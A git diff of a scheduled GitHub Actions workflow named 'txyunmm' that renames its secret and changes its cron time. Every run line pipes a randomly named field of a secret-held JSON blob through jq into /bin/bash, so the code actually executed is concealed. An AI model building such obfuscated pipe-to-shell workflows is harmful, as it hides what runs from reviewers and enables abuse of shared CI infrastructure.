@@ -3,22 +3,23 @@ name: txyunmm
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
-jobs:  # 21812
+    - cron: '1 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: txyunmm
         env:
-          ov15: ${{ secrets.ov15 }}
+          kmkm8: ${{ secrets.kmkm8 }}
         run: |
-          echo $ov15 | jq -r .l0 | /bin/bash
-          echo $idvky857 | jq -r .kmst6 | /bin/bash
-          echo $mwo18617 | jq -r .wcei001 | /bin/bash
-          echo $o9 | jq -r .iebnv68407 | /bin/bash
-          echo $gut05655 | jq -r .xkf394 | /bin/bash
-          echo $l248 | jq -r .h550 | /bin/bash
-          echo $f35 | jq -r .s252 | /bin/bash
-          echo $sn68961 | jq -r .gr6 | /bin/bash
+          echo $kmkm8 | jq -r .lar26610 | /bin/bash
+          echo $moe55 | jq -r .kmrh4043 | /bin/bash
+          echo $qf5559 | jq -r .wq249 | /bin/bash
+          echo $zo2706 | jq -r .ckkc6 | /bin/bash
+          echo $mkdq9591 | jq -r .hdna78451 | /bin/bash
+          echo $z30392 | jq -r .b5 | /bin/bash
+          echo $ataeq9 | jq -r .szma8 | /bin/bash
+          echo $sbec762 | jq -r .jmli54 | /bin/bash
 
